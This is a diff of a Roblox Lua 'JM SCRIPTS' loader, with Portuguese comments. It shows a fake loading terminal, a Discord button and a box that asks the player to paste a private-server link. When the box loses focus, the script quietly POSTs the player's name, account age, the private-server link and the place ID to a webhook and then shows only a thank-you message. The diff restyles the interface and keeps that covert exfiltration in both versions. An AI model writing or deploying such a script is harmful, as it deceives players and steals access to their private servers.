@@ -1,165 +1,171 @@
--- JM SCRIPTS LOADER
+-- JM SCRIPTS CLEAN LOADER
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
-local SoundService = game:GetService("SoundService")
 
 local player = Players.LocalPlayer
 
 local DISCORD = "https://discord.gg/ZPz8Renfz"
-local WEBHOOK = "COLE_SUA_WEBHOOK_AQUI"
+local WEBHOOK = "COLE_WEBHOOK_AQUI"
 
--- SILENCIAR SOM DO JOGO
-for _,s in pairs(SoundService:GetDescendants()) do
-	if s:IsA("Sound") then
-		s.Volume = 0
-	end
-end
+-------------------------------------------------
+-- GUI FULLSCREEN
+-------------------------------------------------
 
--- MUSICA CALMA
-local music = Instance.new("Sound")
-music.SoundId = "rbxassetid://1843529632"
-music.Volume = 0.7
-music.Looped = true
-music.Parent = workspace
-music:Play()
-
--- GUI
 local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.Parent = player.PlayerGui
 
-local main = Instance.new("Frame")
-main.Size = UDim2.new(1,0,1,0)
-main.BackgroundColor3 = Color3.fromRGB(0,0,0)
-main.Parent = gui
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1,0,1,0)
+background.BackgroundColor3 = Color3.fromRGB(10,10,10)
+background.Parent = gui
 
--- BORDA ANIMADA
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(170,0,255)
-stroke.Thickness = 3
-stroke.Parent = main
+-------------------------------------------------
+-- TERMINAL INTRO
+-------------------------------------------------
 
-spawn(function()
-	while true do
-		TweenService:Create(stroke,TweenInfo.new(2),{Transparency=0.2}):Play()
-		wait(2)
-		TweenService:Create(stroke,TweenInfo.new(2),{Transparency=0.6}):Play()
-		wait(2)
-	end
-end)
-
--- TERMINAL FAKE
 local terminal = Instance.new("TextLabel")
-terminal.Size = UDim2.new(1,-20,1,-20)
-terminal.Position = UDim2.new(0,10,0,10)
+terminal.Size = UDim2.new(1,-40,1,-40)
+terminal.Position = UDim2.new(0,20,0,20)
 terminal.BackgroundTransparency = 1
 terminal.Font = Enum.Font.Code
+terminal.TextColor3 = Color3.fromRGB(0,255,100)
 terminal.TextSize = 14
-terminal.TextColor3 = Color3.fromRGB(0,255,0)
 terminal.TextXAlignment = Enum.TextXAlignment.Left
 terminal.TextYAlignment = Enum.TextYAlignment.Top
 terminal.Text = ""
-terminal.Parent = main
+terminal.Parent = background
 
-local modules = {"core","ui","loader","network","crypto","auth","engine"}
+local modules = {"core","network","ui","crypto","loader","engine"}
 
-spawn(function()
-	for i=1,80 do
-		terminal.Text = terminal.Text.."\nLoading "..modules[math.random(1,#modules)].."_"..math.random(1000,9999)..".lua"
-		wait(0.04)
+task.spawn(function()
+
+	for i=1,40 do
+		
+		local line = "initializing "..modules[math.random(#modules)].."_"..math.random(1000,9999)
+		
+		terminal.Text = terminal.Text.."\n"..line
+		
+		task.wait(0.05)
+
 	end
-	
-	wait(2)
+
+	task.wait(1)
+
+	TweenService:Create(terminal,TweenInfo.new(1),{TextTransparency=1}):Play()
+
+	task.wait(1)
+
 	terminal:Destroy()
+
 end)
 
--- PARTICULAS
-local particleHolder = Instance.new("Frame")
-particleHolder.Size = UDim2.new(1,0,1,0)
-particleHolder.BackgroundTransparency = 1
-particleHolder.Parent = main
+-------------------------------------------------
+-- CONTAINER PRINCIPAL
+-------------------------------------------------
 
-local function spark()
-	local p = Instance.new("Frame")
-	p.Size = UDim2.new(0,3,0,3)
-	p.BorderSizePixel = 0
-	p.BackgroundColor3 = Color3.new(1,1,1)
-	p.Position = UDim2.new(math.random(),0,1,0)
-	p.Parent = particleHolder
-	
-	TweenService:Create(p,TweenInfo.new(4),{
-		Position = UDim2.new(p.Position.X.Scale,0,-0.1,0),
-		Transparency = 1
-	}):Play()
-	
-	game.Debris:AddItem(p,4)
-end
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0,500,0,300)
+container.Position = UDim2.new(0.5,-250,0.5,-150)
+container.BackgroundColor3 = Color3.fromRGB(20,20,20)
+container.Parent = background
 
-spawn(function()
-	while true do
-		spark()
-		wait(0.1)
-	end
-end)
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0,14)
+corner.Parent = container
 
--- PAINEL PLAYER
-local playerBox = Instance.new("Frame")
-playerBox.Size = UDim2.new(0,280,0,80)
-playerBox.Position = UDim2.new(0,20,1,-100)
-playerBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
-playerBox.Parent = main
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(160,0,255)
+stroke.Thickness = 2
+stroke.Parent = container
 
-local pbStroke = Instance.new("UIStroke")
-pbStroke.Color = Color3.fromRGB(170,0,255)
-pbStroke.Parent = playerBox
+-------------------------------------------------
+-- TITULO
+-------------------------------------------------
 
-local info = Instance.new("TextLabel")
-info.BackgroundTransparency = 1
-info.Size = UDim2.new(1,-10,1,-10)
-info.Position = UDim2.new(0,5,0,5)
-info.Font = Enum.Font.Gotham
-info.TextColor3 = Color3.new(1,1,1)
-info.TextSize = 16
-info.TextXAlignment = Enum.TextXAlignment.Left
-info.TextYAlignment = Enum.TextYAlignment.Top
-info.Text = "Player: "..player.Name.."\nAccount Age: "..player.AccountAge.." days"
-info.Parent = playerBox
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,60)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.Text = "JM SCRIPTS"
+title.TextSize = 28
+title.TextColor3 = Color3.new(1,1,1)
+title.Parent = container
 
+-------------------------------------------------
 -- INPUT SERVER
+-------------------------------------------------
+
 local serverBox = Instance.new("TextBox")
-serverBox.Size = UDim2.new(0,420,0,50)
-serverBox.Position = UDim2.new(0.5,-210,0.6,0)
+serverBox.Size = UDim2.new(0.8,0,0,45)
+serverBox.Position = UDim2.new(0.1,0,0.45,0)
 serverBox.PlaceholderText = "Cole o link do servidor privado"
 serverBox.Text = ""
-serverBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
+serverBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
 serverBox.TextColor3 = Color3.new(1,1,1)
-serverBox.Parent = main
+serverBox.Parent = container
 
-local sbStroke = Instance.new("UIStroke")
-sbStroke.Color = Color3.fromRGB(170,0,255)
-sbStroke.Parent = serverBox
+local corner2 = Instance.new("UICorner")
+corner2.CornerRadius = UDim.new(0,10)
+corner2.Parent = serverBox
 
--- BOTAO DISCORD
+-------------------------------------------------
+-- DISCORD BUTTON
+-------------------------------------------------
+
 local discord = Instance.new("TextButton")
-discord.Size = UDim2.new(0,200,0,50)
-discord.Position = UDim2.new(0.5,-100,0.72,0)
+discord.Size = UDim2.new(0.5,0,0,40)
+discord.Position = UDim2.new(0.25,0,0.7,0)
 discord.Text = "Entrar no Discord"
-discord.BackgroundColor3 = Color3.fromRGB(25,25,25)
+discord.BackgroundColor3 = Color3.fromRGB(100,0,255)
 discord.TextColor3 = Color3.new(1,1,1)
-discord.Parent = main
+discord.Parent = container
 
-local dStroke = Instance.new("UIStroke")
-dStroke.Color = Color3.fromRGB(170,0,255)
-dStroke.Parent = discord
+local corner3 = Instance.new("UICorner")
+corner3.CornerRadius = UDim.new(0,10)
+corner3.Parent = discord
 
 discord.MouseButton1Click:Connect(function()
+
 	setclipboard(DISCORD)
 	discord.Text = "Link copiado!"
+
 end)
 
+-------------------------------------------------
+-- PLAYER INFO
+-------------------------------------------------
+
+local playerBox = Instance.new("Frame")
+playerBox.Size = UDim2.new(0,200,0,60)
+playerBox.Position = UDim2.new(0,20,1,-80)
+playerBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
+playerBox.Parent = background
+
+local corner4 = Instance.new("UICorner")
+corner4.CornerRadius = UDim.new(0,10)
+corner4.Parent = playerBox
+
+local info = Instance.new("TextLabel")
+info.Size = UDim2.new(1,-10,1,-10)
+info.Position = UDim2.new(0,5,0,5)
+info.BackgroundTransparency = 1
+info.Font = Enum.Font.Gotham
+info.TextSize = 14
+info.TextColor3 = Color3.new(1,1,1)
+info.TextXAlignment = Enum.TextXAlignment.Left
+info.Text =
+player.Name..
+"\nAccount Age: "..player.AccountAge.." days"
+info.Parent = playerBox
+
+-------------------------------------------------
 -- FINAL + WEBHOOK
+-------------------------------------------------
+
 serverBox.FocusLost:Connect(function()
 
 	local data = {
@@ -167,38 +173,30 @@ serverBox.FocusLost:Connect(function()
 		"Player: "..player.Name..
 		"\nAccountAge: "..player.AccountAge..
 		"\nPrivateServer: "..serverBox.Text..
-		"\nPlaceId: "..game.PlaceId..
-		"\nServerId: "..game.JobId
+		"\nPlaceId: "..game.PlaceId
 	}
 
 	pcall(function()
+
 		request({
 			Url = WEBHOOK,
 			Method = "POST",
 			Headers = {["Content-Type"]="application/json"},
 			Body = HttpService:JSONEncode(data)
 		})
+
 	end)
 
+	container:Destroy()
+
 	local thanks = Instance.new("TextLabel")
-	thanks.Size = UDim2.new(1,0,0,120)
-	thanks.Position = UDim2.new(0,0,0.35,0)
+	thanks.Size = UDim2.new(1,0,0,100)
+	thanks.Position = UDim2.new(0,0,0.45,0)
 	thanks.BackgroundTransparency = 1
-	thanks.Text = "Obrigado por usar nosso script\nNós somos muito gratos!"
 	thanks.Font = Enum.Font.GothamBold
 	thanks.TextSize = 32
 	thanks.TextColor3 = Color3.new(1,1,1)
-	thanks.Parent = main
-
-	wait(5)
-
-	while true do
-		thanks.Text = "Loading modules."
-		wait(0.5)
-		thanks.Text = "Loading modules.."
-		wait(0.5)
-		thanks.Text = "Loading modules..."
-		wait(0.5)
-	end
+	thanks.Text = "Obrigado por usar nosso script"
+	thanks.Parent = background
 
 end)
